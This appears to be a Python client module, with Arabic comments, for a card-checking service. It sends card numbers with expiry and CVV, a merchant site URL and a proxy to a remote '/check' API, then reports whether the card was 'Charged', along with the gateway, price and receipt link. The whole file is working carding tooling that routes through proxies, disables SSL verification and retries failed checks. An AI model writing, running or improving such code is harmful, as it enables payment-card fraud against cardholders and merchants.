"""
checker_bridge.py — يستخدم Railway API مباشرة
API: https://api-production-49ca.up.railway.app/check
"""

import asyncio
import aiohttp
import logging
import random
import time
from collections import deque

log = logging.getLogger("checker_bridge")

API_BASE = "https://api-production-49ca.up.railway.app"
_REQUEST_TIMEOUT = 60
_CONNECT_TIMEOUT  = 10
_MAX_RETRIES      = 2

# ── Session pool ──────────────────────────────────────────────────────────────
_sessions: list[aiohttp.ClientSession] = []
_SESSION_POOL_SIZE = 10
_session_lock = asyncio.Lock()

async def _get_session() -> aiohttp.ClientSession:
    global _sessions
    async with _session_lock:
        # نظف الـ sessions المغلقة
        _sessions = [s for s in _sessions if not s.closed]
        if not _sessions:
            timeout = aiohttp.ClientTimeout(
                total=_REQUEST_TIMEOUT,
                connect=_CONNECT_TIMEOUT,
            )
            connector = aiohttp.TCPConnector(
                limit=500,
                limit_per_host=200,
                ttl_dns_cache=300,
                ssl=False,
            )
            for _ in range(_SESSION_POOL_SIZE):
                _sessions.append(aiohttp.ClientSession(
                    timeout=timeout,
                    connector=connector if _ == 0 else aiohttp.TCPConnector(ssl=False),
                ))
        return random.choice(_sessions)


def _proxy_data_to_proxy_str(proxy_data: dict | None) -> str | None:
    if not proxy_data:
        return None
    url = proxy_data.get("proxy_url")
    if url:
        return url
    ip   = proxy_data.get("ip", "") or proxy_data.get("host", "")
    port = proxy_data.get("port", "")
    user = proxy_data.get("username", "") or proxy_data.get("user", "")
    pwd  = proxy_data.get("password", "") or proxy_data.get("pass", "")
    if not ip or not port:
        return None
    if user and pwd:
        return f"http://{user}:{pwd}@{ip}:{port}"
    return f"http://{ip}:{port}"


async def check_card_site(
    cc_str: str,
    site_url: str,
    proxy_data: dict | None,
) -> dict:
    proxy_str = _proxy_data_to_proxy_str(proxy_data)
    if not proxy_str:
        return {
            "Response": "No proxy – add one with /proxy",
            "Price": "-", "Gate": "-", "Site": site_url,
            "Charged": "False", "status_code": "NO_PROXY", "error": "no proxy configured",
        }

    url = f"{API_BASE}/check?card={cc_str}&url={site_url}&proxy={proxy_str}"

    for attempt in range(_MAX_RETRIES + 1):
        session = await _get_session()
        try:
            async with session.get(url, ssl=False, allow_redirects=True) as resp:
                if resp.status != 200:
                    text = await resp.text()
                    if attempt < _MAX_RETRIES:
                        await asyncio.sleep(1)
                        continue
                    return {
                        "Response": f"HTTP_{resp.status}", "Price": "-",
                        "Gate": "-", "Site": site_url, "Charged": "False",
                        "status_code": f"HTTP_{resp.status}", "error": text[:120],
                    }
                data = await resp.json(content_type=None)
                response  = data.get("Response", "ERROR")
                error_msg = data.get("error", "")
                status_cd = data.get("status_code", "")
                if response == "ERROR" and (error_msg or status_cd):
                    response = f"{status_cd}: {error_msg}".strip(": ")
                return {
                    "Response":    response,
                    "Price":       data.get("Price", "-"),
                    "Gate":        data.get("Gate", "-"),
                    "Site":        data.get("Site", site_url),
                    "Charged":     data.get("Charged", "False"),
                    "status_code": status_cd,
                    "error":       error_msg,
                    "receipt_url": data.get("receipt_url", ""),
                }
        except asyncio.TimeoutError:
            if attempt < _MAX_RETRIES:
                await asyncio.sleep(0.5)
                continue
            return {
                "Response": "TIMEOUT", "Price": "-", "Gate": "-",
                "Site": site_url, "Charged": "False",
                "status_code": "TIMEOUT", "error": "request timed out",
            }
        except Exception as exc:
            if attempt < _MAX_RETRIES:
                await asyncio.sleep(0.5)
                continue
            return {
                "Response": str(exc)[:80], "Price": "-", "Gate": "-",
                "Site": site_url, "Charged": "False",
                "status_code": "EXCEPTION", "error": str(exc)[:120],
            }

    return {"Response": "ERROR", "Price": "-", "Gate": "-",
            "Site": site_url, "Charged": "False",
            "status_code": "MAX_RETRIES", "error": "max retries exceeded"}


async def test_site(site_url: str, proxy_data: dict | None) -> dict:
    dummy_cc = "4111111111111111|12|2030|123"
    return await check_card_site(dummy_cc, site_url, proxy_data)


def get_all_nodes() -> list:
    return [API_BASE]

def check_node_health() -> dict:
    return {API_BASE: {"healthy": True, "in_flight": 0}}

def is_node_disabled(url: str) -> bool:
    return False

def disable_node(url: str) -> bool:
    return False

def enable_node(url: str) -> bool:
    return True
